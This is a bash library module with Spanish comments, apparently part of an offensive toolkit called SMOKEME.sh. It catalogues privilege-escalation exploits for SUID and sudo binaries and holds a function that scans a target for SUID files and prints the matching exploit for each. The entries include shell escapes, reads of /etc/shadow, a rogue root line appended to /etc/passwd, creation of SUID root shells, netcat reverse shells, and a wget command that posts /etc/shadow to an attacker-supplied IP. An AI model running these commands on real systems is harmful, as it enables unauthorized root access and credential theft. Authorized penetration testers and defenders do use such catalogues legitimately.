#!/bin/bash
# ============================================================
# suid_binaries.sh - Binarios SUID / escalada (Libreria)
#
# Que hace: catalogo GTFOBins de binarios SUID explotables y
#   escaladas via sudo, con categoria y descripcion. Escanea
#   SUID en el target si hay XML de scan.
#
# Exporta (se sourcea desde SMOKEME.sh):
#   Arrays    : SUID_EXPLOIT, SUID_CATEGORY, SUID_DESCRIPTION
#   Funciones : get_suid_exploit, get_suid_exploits_by_category,
#               get_all_suid_exploits, get_sudo_escalation,
#               scan_suid_binaries.
#
# No es ejecutable por si sola; es un modulo de datos.
# ============================================================

declare -gA SUID_EXPLOIT
declare -gA SUID_CATEGORY
declare -gA SUID_DESCRIPTION

# ============================================================
# SHELL ESCAPE DIRECTO
# ============================================================

SUID_EXPLOIT[nmap]="/tmp/nmap_shell.sh <<'EOF'
#!/bin/sh
echo 'os.execute(\"/bin/sh\")' > /tmp/nse.nse
nmap --script=/tmp/nse.nse
EOF
chmod +x /tmp/nmap_shell.sh
/tmp/nmap_shell.sh"
SUID_CATEGORY[nmap]="shell"
SUID_DESCRIPTION[nmap]="Nmap interactive mode"

SUID_EXPLOIT[vim]="vim -c ':!/bin/sh'"
SUID_CATEGORY[vim]="shell"
SUID_DESCRIPTION[vim]="Vim shell escape"

SUID_EXPLOIT[nvi]="nvi -c '!sh'"
SUID_CATEGORY[nvi]="shell"
SUID_DESCRIPTION[nvi]="BSD vi shell escape"

SUID_EXPLOIT[find]="find . -exec /bin/sh -p \\; -quit"
SUID_CATEGORY[find]="shell"
SUID_DESCRIPTION[find]="Find exec shell"

SUID_EXPLOIT[bash]="bash -p"
SUID_CATEGORY[bash]="shell"
SUID_DESCRIPTION[bash]="Bash privileged mode"

SUID_EXPLOIT[sh]="sh -p"
SUID_CATEGORY[sh]="shell"
SUID_DESCRIPTION[sh]="Sh privileged mode"

SUID_EXPLOIT[env]="env /bin/sh -p"
SUID_CATEGORY[env]="shell"
SUID_DESCRIPTION[env]="Env shell escape"

SUID_EXPLOIT[awk]="awk 'BEGIN {system(\"/bin/sh\")}'"
SUID_CATEGORY[awk]="shell"
SUID_DESCRIPTION[awk]="Awk shell escape"

SUID_EXPLOIT[gawk]="gawk 'BEGIN {system(\"/bin/sh\")}'"
SUID_CATEGORY[gawk]="shell"
SUID_DESCRIPTION[gawk]="Gawk shell escape"

SUID_EXPLOIT[perl]="perl -e 'exec \"/bin/sh\";'"
SUID_CATEGORY[perl]="shell"
SUID_DESCRIPTION[perl]="Perl shell escape"

SUID_EXPLOIT[python]="python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'"
SUID_CATEGORY[python]="shell"
SUID_DESCRIPTION[python]="Python shell escape"

SUID_EXPLOIT[python2]="python2 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'"
SUID_CATEGORY[python2]="shell"
SUID_DESCRIPTION[python2]="Python2 shell escape"

SUID_EXPLOIT[ruby]="ruby -e 'exec \"/bin/sh\"'"
SUID_CATEGORY[ruby]="shell"
SUID_DESCRIPTION[ruby]="Ruby shell escape"

SUID_EXPLOIT[lua]="lua -e 'os.execute(\"/bin/sh\")'"
SUID_CATEGORY[lua]="shell"
SUID_DESCRIPTION[lua]="Lua shell escape"

SUID_EXPLOIT[php]="php -r 'pcntl_exec(\"/bin/sh\");'"
SUID_CATEGORY[php]="shell"
SUID_DESCRIPTION[php]="PHP shell escape"

SUID_EXPLOIT[node]="node -e 'child_process.spawn(\"/bin/sh\",[],{stdio:[0,1,2]})'"
SUID_CATEGORY[node]="shell"
SUID_DESCRIPTION[node]="Node.js shell escape"

# ============================================================
# PAGER / FILE READERS
# ============================================================

SUID_EXPLOIT[less]="less /etc/passwd
!/bin/sh"
SUID_CATEGORY[less]="pager"
SUID_DESCRIPTION[less]="Less shell via !"

SUID_EXPLOIT[more]="more /etc/passwd
!/bin/sh"
SUID_CATEGORY[more]="pager"
SUID_DESCRIPTION[more]="More shell via !"

SUID_EXPLOIT[nl]="nl /etc/passwd
!/bin/sh"
SUID_CATEGORY[nl]="pager"
SUID_DESCRIPTION[nl]="Nl shell via !"

SUID_EXPLOIT[man]="man man
!/bin/sh"
SUID_CATEGORY[man]="pager"
SUID_DESCRIPTION[man]="Man shell via !"

SUID_EXPLOIT[ftp]="ftp
!/bin/sh"
SUID_CATEGORY[ftp]="pager"
SUID_DESCRIPTION[ftp]="FTP shell via !"



# ============================================================
# FILE WRITE / READ
# ============================================================

SUID_EXPLOIT[tar]="tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
SUID_CATEGORY[tar]="file"
SUID_DESCRIPTION[tar]="Tar arbitrary command execution"

SUID_EXPLOIT[zip]="zip /tmp/test.zip /tmp/test -T --unzip-command='sh -c /bin/sh'"
SUID_CATEGORY[zip]="file"
SUID_DESCRIPTION[zip]="Zip shell via -T"

SUID_EXPLOIT[unzip]="unzip -K /bin/sh"
SUID_CATEGORY[unzip]="file"
SUID_DESCRIPTION[unzip]="Unzip shell"

SUID_EXPLOIT[cp]="cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh"
SUID_CATEGORY[cp]="file"
SUID_DESCRIPTION[cp]="CP to create SUID shell"

SUID_EXPLOIT[mv]="# Primero necesitas escribir en un directorio controlado
# mv puede usarse para sobreescribir archivos criticos"
SUID_CATEGORY[mv]="file"
SUID_DESCRIPTION[mv]="MV for file overwrite"

SUID_EXPLOIT[dd]="dd if=/bin/sh of=/tmp/rootsh bs=4096
chmod +s /tmp/rootsh
/tmp/rootsh -p"
SUID_CATEGORY[dd]="file"
SUID_DESCRIPTION[dd]="DD to copy shell"

SUID_EXPLOIT[tee]="echo 'root2:\$1\$salt\$hash:0:0:root:/root:/bin/bash' | tee -a /etc/passwd"
SUID_CATEGORY[tee]="file"
SUID_DESCRIPTION[tee]="Tee to write to files"

SUID_EXPLOIT[base64]="base64 /etc/shadow | base64 -d"
SUID_CATEGORY[base64]="file"
SUID_DESCRIPTION[base64]="Base64 file read"

SUID_EXPLOIT[openssl]="openssl enc -in /etc/shadow"
SUID_CATEGORY[openssl]="file"
SUID_DESCRIPTION[openssl]="OpenSSL file read"

# ============================================================
# NETWORK
# ============================================================

SUID_EXPLOIT[nmap_old]="nmap --interactive
!sh"
SUID_CATEGORY[nmap_old]="network"
SUID_DESCRIPTION[nmap_old]="Nmap old interactive mode (< 5.21)"

SUID_EXPLOIT[nc]="nc -e /bin/sh 127.0.0.1 4444"
SUID_CATEGORY[nc]="network"
SUID_DESCRIPTION[nc]="Netcat reverse shell"

SUID_EXPLOIT[ncat]="ncat -e /bin/sh 127.0.0.1 4444"
SUID_CATEGORY[ncat]="network"
SUID_DESCRIPTION[ncat]="Ncat reverse shell"

SUID_EXPLOIT[ncat_ssl]="ncat --ssl 127.0.0.1 4444 -e /bin/sh"
SUID_CATEGORY[ncat_ssl]="network"
SUID_DESCRIPTION[ncat_ssl]="Ncat SSL reverse shell"

SUID_EXPLOIT[curl]="curl file:///etc/shadow -o /tmp/shadow
cat /tmp/shadow"
SUID_CATEGORY[curl]="network"
SUID_DESCRIPTION[curl]="Curl file read"

SUID_EXPLOIT[wget]="wget --post-file=/etc/shadow http://YOUR_IP:8000/shadow"
SUID_CATEGORY[wget]="network"
SUID_DESCRIPTION[wget]="Wget file exfil"

# ============================================================
# SUDO (no SUID pero util)
# ============================================================

SUID_EXPLOIT[sudo_vim]="sudo vim -c ':!/bin/sh'"
SUID_CATEGORY[sudo_vim]="sudo"
SUID_DESCRIPTION[sudo_vim]="Sudo vim escape"

SUID_EXPLOIT[sudo_find]="sudo find . -exec /bin/sh \\; -quit"
SUID_CATEGORY[sudo_find]="sudo"
SUID_DESCRIPTION[sudo_find]="Sudo find escape"

SUID_EXPLOIT[sudo_python]="sudo python3 -c 'import os; os.system(\"/bin/sh\")'"
SUID_CATEGORY[sudo_python]="sudo"
SUID_DESCRIPTION[sudo_python]="Sudo python escape"

SUID_EXPLOIT[sudo_perl]="sudo perl -e 'exec \"/bin/sh\";'"
SUID_CATEGORY[sudo_perl]="sudo"
SUID_DESCRIPTION[sudo_perl]="Sudo perl escape"

SUID_EXPLOIT[sudo_ruby]="sudo ruby -e 'exec \"/bin/sh\"'"
SUID_CATEGORY[sudo_ruby]="sudo"
SUID_DESCRIPTION[sudo_ruby]="Sudo ruby escape"

SUID_EXPLOIT[sudo_less]="sudo less /etc/passwd
!/bin/sh"
SUID_CATEGORY[sudo_less]="sudo"
SUID_DESCRIPTION[sudo_less]="Sudo less escape"

SUID_EXPLOIT[sudo_more]="sudo more /etc/passwd
!/bin/sh"
SUID_CATEGORY[sudo_more]="sudo"
SUID_DESCRIPTION[sudo_more]="Sudo more escape"

SUID_EXPLOIT[sudo_awk]="sudo awk 'BEGIN {system(\"/bin/sh\")}'"
SUID_CATEGORY[sudo_awk]="sudo"
SUID_DESCRIPTION[sudo_awk]="Sudo awk escape"

SUID_EXPLOIT[sudo_env]="sudo env /bin/sh"
SUID_CATEGORY[sudo_env]="sudo"
SUID_DESCRIPTION[sudo_env]="Sudo env escape"

SUID_EXPLOIT[sudo_nmap]="sudo nmap --interactive
!sh"
SUID_CATEGORY[sudo_nmap]="sudo"
SUID_DESCRIPTION[sudo_nmap]="Sudo nmap escape"

SUID_EXPLOIT[sudo_man]="sudo man man
!/bin/sh"
SUID_CATEGORY[sudo_man]="sudo"
SUID_DESCRIPTION[sudo_man]="Sudo man escape"

SUID_EXPLOIT[sudo_ftp]="sudo ftp
!/bin/sh"
SUID_CATEGORY[sudo_ftp]="sudo"
SUID_DESCRIPTION[sudo_ftp]="Sudo ftp escape"

SUID_EXPLOIT[sudo_zip]="sudo zip /tmp/test.zip /tmp/test -T --unzip-command='sh -c /bin/sh'"
SUID_CATEGORY[sudo_zip]="sudo"
SUID_DESCRIPTION[sudo_zip]="Sudo zip escape"

SUID_EXPLOIT[sudo_tar]="sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
SUID_CATEGORY[sudo_tar]="sudo"
SUID_DESCRIPTION[sudo_tar]="Sudo tar escape"

# ============================================================
# FUNCIONES
# ============================================================

get_suid_exploit() {
    local binary="$1"
    local bin_lower=$(echo "$binary" | tr '[:upper:]' '[:lower:]')
    
    if [ -n "${SUID_EXPLOIT[$bin_lower]+x}" ]; then
        echo -e "  ${G}[+] ${SUID_DESCRIPTION[$bin_lower]}${W}"
        echo -e "  ${C}Categoria: ${SUID_CATEGORY[$bin_lower]}${W}"
        echo -e "  ${Y}Exploit:${W}"
        echo "${SUID_EXPLOIT[$bin_lower]}" | sed 's/^/    /'
        return 0
    fi
    return 1
}

get_suid_exploits_by_category() {
    local category="$1"
    local count=0
    
    for bin in "${!SUID_EXPLOIT[@]}"; do
        if [ "${SUID_CATEGORY[$bin]}" = "$category" ]; then
            echo -e "  ${G}$bin${W} - ${SUID_DESCRIPTION[$bin]}"
            count=$((count + 1))
        fi
    done
    echo -e "\n  ${C}Total en categoria '$category': $count${W}"
}

scan_suid_binaries() {
    echo -e "${B}${C}=== ESCANEO DE BINARIOS SUID ===${W}\n"
    
    local suid_bins=$(find / -perm -4000 -type f 2>/dev/null)
    
    if [ -z "$suid_bins" ]; then
        echo -e "  ${Y}No se encontraron binarios SUID${W}"
        return
    fi
    
    while IFS= read -r bin; do
        local bin_name=$(basename "$bin")
        echo -e "${B}  $bin${W}"
        
        if get_suid_exploit "$bin_name"; then
            echo ""
        else
            echo -e "    ${DIM}(sin exploit conocido en la base de datos)${W}\n"
        fi
    done <<< "$suid_bins"
}

get_all_suid_exploits() {
    echo -e "${B}${C}=== BINARIOS SUID EXPLOTABLES ===${W}\n"
    
    for bin in $(echo "${!SUID_EXPLOIT[@]}" | tr ' ' '\n' | sort); do
        # Solo mostrar los que no son sudo
        [[ "$bin" == sudo_* ]] && continue
        echo -e "  ${G}${bin}${W} [${SUID_CATEGORY[$bin]}]"
        echo -e "    ${SUID_DESCRIPTION[$bin]}"
    done
}

get_sudo_escalation() {
    echo -e "${B}${C}=== ESCALADA VIA SUDO ===${W}\n"
    
    for bin in $(echo "${!SUID_EXPLOIT[@]}" | tr ' ' '\n' | sort); do
        [[ "$bin" != sudo_* ]] && continue
        local real_bin="${bin#sudo_}"
        echo -e "  ${G}sudo $real_bin${W}"
        echo -e "    ${SUID_DESCRIPTION[$bin]}"
    done
}
